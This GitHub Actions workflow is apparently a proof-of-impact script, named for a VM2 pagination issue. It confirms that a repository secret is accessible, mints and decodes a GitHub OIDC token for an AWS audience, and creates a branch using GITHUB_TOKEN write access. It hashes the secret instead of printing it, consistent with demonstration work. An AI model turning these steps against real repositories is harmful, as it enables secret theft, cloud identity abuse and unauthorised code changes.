name: VM2 pagination impact proof
on:
  push:
    branches: [main]
permissions:
  contents: write
  id-token: write
jobs:
  proof:
    runs-on: ubuntu-latest
    env:
      CANARY: ${{ secrets.VM2_PAGINATION_CANARY }}
    steps:
      - name: Prove repository secret access safely
        shell: bash
        run: |
          if [ -n "$CANARY" ]; then
            echo "CANARY_PRESENT=1"
            printf "%s" "$CANARY" | sha256sum | awk '{print "CANARY_SHA256="$1}'
          else
            echo "CANARY_PRESENT=0"
          fi
      - name: Prove GitHub OIDC identity safely
        shell: bash
        run: |
          set -euo pipefail
          resp="$(curl -fsSL -H "Authorization: Bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com")"
          OIDC_JSON="$resp" python3 - <<'PY'
          import os, json, base64
          tok=json.loads(os.environ["OIDC_JSON"])["value"]
          p=tok.split(".")[1]; p += "="*((4-len(p)%4)%4)
          c=json.loads(base64.urlsafe_b64decode(p))
          print("OIDC_PRESENT=1")
          for k in ("aud","repository","ref","sha","actor","event_name"):
              print(f"OIDC_{k.upper()}={c.get(k)}")
          PY
      - name: Prove GITHUB_TOKEN write authority
        shell: bash
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          set -euo pipefail
          branch="vm2-pagination-proof-${GITHUB_SHA:0:12}"
          code="$(curl -sS -o /tmp/create-ref.json -w "%{http_code}" -X POST -H "Accept: application/vnd.github+json" -H "Authorization: Bearer ${GH_TOKEN}" -H "X-GitHub-Api-Version: 2026-03-10" "https://api.github.com/repos/${GITHUB_REPOSITORY}/git/refs" -d "{\"ref\":\"refs/heads/${branch}\",\"sha\":\"${GITHUB_SHA}\"}")"
          echo "GITHUB_TOKEN_BRANCH_CREATE_HTTP=$code"
          if [ "$code" = "201" ]; then
            echo "GITHUB_TOKEN_WRITE_SUCCEEDED=1"
          else
            echo "GITHUB_TOKEN_WRITE_SUCCEEDED=0"
            cat /tmp/create-ref.json
            exit 1
          fi

